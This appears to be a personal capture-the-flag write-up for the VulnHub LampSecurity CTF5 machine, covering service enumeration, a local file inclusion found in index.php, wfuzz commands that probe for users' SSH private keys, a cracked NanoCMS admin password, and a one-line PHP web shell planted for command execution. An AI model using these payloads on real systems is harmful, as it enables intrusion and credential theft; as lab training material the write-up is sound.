Security: CTF5

[Machine](https://www.vulnhub.com/entry/lampsecurity-ctf5,84/ "https://www.vulnhub.com/entry/lampsecurity-ctf5,84/")

## Reconnaissance

### nmap

* ssh
* smtp
* 80 - httpd
* pop3
* rpcbind
* 139, 445 - netbios 
* imap
* 901 - http Samba Admin Server
* mysql
* 40050 - unknown

### Vulnerable versions

* [ ] ssh
* [ ] smtp
* [ ] 80 httpd
  ??? pop3
* [ ] rpcbind
* [ ] netbios
  ??? imap
  ??? 901
* [ ] mysql
  ??? 40050

### smtp

```bash
nc -vn 192.168.88.220 25
HELO x
MAIL FROM:test@test.com
RCPT TO:root
```
Cause nmap `smtp-enum-users` script didn't work.

### http 80

#### main page

Nothing.

#### Blog

* Nano CMS.
* Admin login.
* user: andy

#### /mail

* SquirrelMail version 1.4.11-1.fc8.
* Login form.

#### Contacts

* Form.

#### Events

* Login form.
* users: patrick, jennifer

#### dirb

* nothing interesting.

#### nikto

* phpMyAdmin 3.1.4

#### /events/robots.txt

A lot of urls.

### pop3

With `pop3-capabilities` nmap script:
* pop3-capabilities: UIDL USER LOGIN-DELAY(180) STLS TOP

### smb

With `smbmap`:
* home
* IPC$
* Samba Server Version 3.0.26a-6.fc8.
* no access.
* nmap gave a [result](enum/smb/enum.nmap)

My attemts with `smbclient --no-pass //192.168.88.220/` or `smbclient -N -L //192.168.88.220/` were useless.

## Thread modeling

1. Search public exploits on new-found services.

2. Search for File Inclusion.

3. Attempt to inject SQL code.

4. brute-force ssh with hydra based on the found users.

## Vulnerabilities analysis

1. Didn't find usefull cve...But I searched again and found! NanoCMS has a [vulnerability](https://www.securityfocus.com/bid/34508/exploit "https://www.securityfocus.com/bid/34508/exploit").

2. Found LFI at `/index.php?page=../../../../../../etc/passwd%00`.

3. `/list` has response with error on `' test`.

4. Nothing.

## Exploitation

### LFI

I wanted to use wfuzz and brute-force all useful files:
```bash
wfuzz -c -w /usr/share/wordlists/lfi_linux.txt --hs "Warning" http://192.168.88.220/index.php?page=../../../../../../FUZZ%00 > wfuzz.txt
```

Brute-force `.ssh` and `id_rsa` key, but nothing:
```
wfuzz -c -w ../enum/creds/users.txt --hs "Warning" http://192.168.88.220/index.php?page=../../../../../../home/FUZZ/.ssh/id_rsa%00 > ssh_keys.txt 
```

I tried all cases and files...OKAY, I can't exploit it. Too heavy. You can find exploit on this case with usage of `phpinfo.php`, but I'll try it later...

### Use /~andy/data/pagesdata.txt

Found hash of the password. Crach with [this](https://crackstation.net/ "https://crackstation.net/").
admin: shannon

Next step - try to get RCE.

#### RCE

Go to `New page` and create a file with content:
```php
<?php system($_GET['cmd']); ?>
```

Then, you'll try to get a reverse shell, but nothing.
